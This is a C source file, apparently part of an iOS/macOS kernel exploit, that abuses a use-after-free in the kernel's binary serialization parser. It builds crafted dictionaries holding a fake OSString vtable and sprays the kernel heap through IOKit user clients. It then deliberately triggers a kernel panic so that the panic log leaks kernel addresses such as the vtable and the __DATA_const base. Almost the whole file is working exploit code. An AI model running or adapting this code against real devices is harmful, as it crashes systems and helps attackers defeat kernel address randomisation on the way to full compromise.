#include <stdint.h>             // uint32_t
#include <sys/sysctl.h>         // CTL_*, KERN_OSVERSION, HW_MODEL, sysctl
#include <unistd.h>             // sleep, usleep, sync

#include <IOKit/IOKitLib.h>     // IO*, io_*

#include "common.h"             // DEBUG
#include "io.h"                 // kOS*, dict_parse, _io_*
#include "slide.h"              // get_kernel_anchor, get_kernel_slide
#include "try.h"                // THROW, TRY, RETHROW

#include "uaf_panic.h"

static void print_info(void)
{
    // Neat info
    addr_t anchor = get_kernel_anchor();
    char b[32];
    size_t s;
    int cmd[2];
    DEBUG("************** Info **************");
    DEBUG("* To go along with the panic log *");
    s = sizeof(b);
    cmd[0] = CTL_HW;
    cmd[1] = HW_MODEL;
    if(sysctl(cmd, sizeof(cmd) / sizeof(*cmd), b, &s, NULL, 0) == 0)
    {
        DEBUG("* Model: %-23s *", b);
    }
    s = sizeof(b);

    cmd[0] = CTL_KERN;
    cmd[1] = KERN_OSVERSION;
    if(sysctl(cmd, sizeof(cmd) / sizeof(*cmd), b, &s, NULL, 0) == 0)
    {
        DEBUG("* OS build: %-20s *", b);
    }
    DEBUG("* Anchor: " ADDR
#ifdef __LP64__
        "    "
#else
        "            "
#endif
        " *", anchor);
    DEBUG("**********************************");
}

void uaf_with_vtab(addr_t addr)
{
#ifdef __LP64__
#   define NATIVE "uint64"
#else
#   define NATIVE "uint32"
#endif
    DEBUG("Using UAF to leak a " NATIVE " from address " ADDR "...", addr);
#undef NATIVE

    OSString osstr =
    {
        .vtab = (vtab_t)(addr - 4 * sizeof(void*)),
        .retainCount = 100,
        .flags = kOSStringNoCopy,
        .length = 0,
        .string = NULL,
    };
    uint32_t *data = (uint32_t*)&osstr;
    const char str[4] = "str",
               ref[4] = "ref";
    uint32_t dict[8 + sizeof(OSString) / sizeof(uint32_t)] =
    {
        kOSSerializeMagic,                                              // Magic
        kOSSerializeEndCollection | kOSSerializeDictionary | 4,         // Dictionary with 4 entries

        kOSSerializeString | 4,                                         // String that'll get freed
        *((uint32_t*)str),
        kOSSerializeData | sizeof(OSString),                            // OSData that will replace our string
#ifdef __LP64__
        data[0],                                                        // vtable (lower half)
        data[1],                                                        // vtable (upper half)
        data[2],                                                        // retainCount
        data[3],                                                        // flags
        data[4],                                                        // length
        data[5],                                                        // (padding)
        data[6],                                                        // string pointer (lower half)
        data[7],                                                        // string pointer (upper half)
#else
        data[0],                                                        // vtable
        data[1],                                                        // retainCount
        data[2],                                                        // flags
        data[3],                                                        // length
        data[4],                                                        // string pointer
#endif

        kOSSerializeSymbol | 4,                                         // Just a name
        *((uint32_t*)ref),
        kOSSerializeEndCollection | kOSSerializeObject | 1,             // Call ->retain() on the freed string
    };

    print_info();

    DEBUG("Triggering panic!");

    dict_parse(dict, sizeof(dict));
    // Write everything to disk
    sync();
    // Allow SSH/syslog to deliver latest output
    sleep(3);

    DEBUG("...shit, we're still here.");
}

void uaf_panic_leak_DATA_const_base(void)
{
    uaf_with_vtab(KERNEL_BASE + get_kernel_slide() + 0x244);
}

void uaf_panic_leak_vtab(void)
{
#define NUMSTR_PLUG 255
#define NUMSTR_PAD   64
#define NUM_CLIENTS  16

    DEBUG("Using UAF to leak vtable...");

    const char str[4] = "str";
    uint32_t
    // The trigger
    dict[5] =
    {
        kOSSerializeMagic,                                              // Magic
        kOSSerializeEndCollection | kOSSerializeDictionary | 2,         // Dictionary with 2 entries

        kOSSerializeString | 4,                                         // String that'll get freed
        *((uint32_t*)str),
        kOSSerializeEndCollection | kOSSerializeObject | 1,             // Call ->retain() on the freed string
    },
    // the slot for the trigger
    dict_hole[6] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 2,

        kOSSerializeSymbol | 4,
        *((uint32_t*)str),
        kOSSerializeEndCollection | kOSSerializeString | 4,
        *((uint32_t*)str),
    },
    // to plug the existing holes on the heap
    dict_plug[2 + NUMSTR_PLUG * 4] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | (2 * NUMSTR_PLUG),
    },
    // to get an OSString next to our hole
    dict_pad[2 + NUMSTR_PAD * 4] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | (2 * NUMSTR_PAD),
    };
    for(uint32_t i = 0; i < NUMSTR_PLUG; ++i)
    {
        dict_plug[2 + i * 4    ] = kOSSerializeSymbol | 4;
        dict_plug[2 + i * 4 + 1] = i;
        dict_plug[2 + i * 4 + 2] = kOSSerializeString | 4;
        dict_plug[2 + i * 4 + 3] = i;
        if(i + 1 == NUMSTR_PLUG)
        {
            dict_plug[2 + i * 4 + 2] |= kOSSerializeEndCollection;
        }
    }
    for(uint32_t i = 0; i < NUMSTR_PAD; ++i)
    {
        dict_pad[2 + i * 4    ] = kOSSerializeSymbol | 4;
        dict_pad[2 + i * 4 + 1] = i;
        dict_pad[2 + i * 4 + 2] = kOSSerializeString | 4;
        dict_pad[2 + i * 4 + 3] = i;
        if(i + 1 == NUMSTR_PAD)
        {
            dict_pad[2 + i * 4 + 2] |= kOSSerializeEndCollection;
        }
    }
    PRINT_BUF("dict     ", dict,      sizeof(dict));
    PRINT_BUF("dict_hole", dict_hole, sizeof(dict));
    PRINT_BUF("dict_plug", dict_plug, sizeof(dict));
    PRINT_BUF("dict_pad ", dict_pad,  sizeof(dict));

    DEBUG("Spawning user clients...");
    io_connect_t client_plug,
                 client_hole[NUM_CLIENTS],
                 client_pad [NUM_CLIENTS];

    DEBUG("Plugging existing heap holes...");
    client_plug = _io_spawn_client(dict_plug, sizeof(dict_plug));

    DEBUG("Allocating (hopefully) contiguous memory...");
    for(uint32_t i = 0; i < NUM_CLIENTS; ++i)
    {
        TRY
        ({
            client_hole[i] = _io_spawn_client(dict_hole, sizeof(dict_hole));
            TRY
            ({
                client_pad[i] = _io_spawn_client(dict_pad , sizeof(dict_pad));
            })
            RETHROW
            ({
                _io_release_client(client_hole[i]);
            })
        })
        RETHROW
        ({
            for(; i > 0; --i) // Can't use >= 0 because unsigned
            {
                _io_release_client(client_hole[i - 1]);
                _io_release_client(client_hole[i - 1]);
            }
        })
    }

    TRY
    ({
        DEBUG("Poking holes...");
        // This is equivalent to cleanup, so no try blocks
        for(uint32_t i = 0; i < NUM_CLIENTS; ++i)
        {
            _io_release_client(client_hole[i]);
        }

        print_info();

        DEBUG("Triggering panic!");
        // Write everything to disk
        sync();
        // Async cleanup & allow SSH/syslog to deliver latest output
        sleep(3);

        dict_parse(dict, sizeof(dict));
        DEBUG("...shit, we're still here.");
    })
    FINALLY
    ({
        for(uint32_t i = 0; i < NUM_CLIENTS; ++i)
        {
            _io_release_client(client_pad[i]);
        }
        _io_release_client(client_plug);
    })

#undef NUMSTR_PLUG
#undef NUMSTR_PAD
#undef NUM_CLIENTS
}
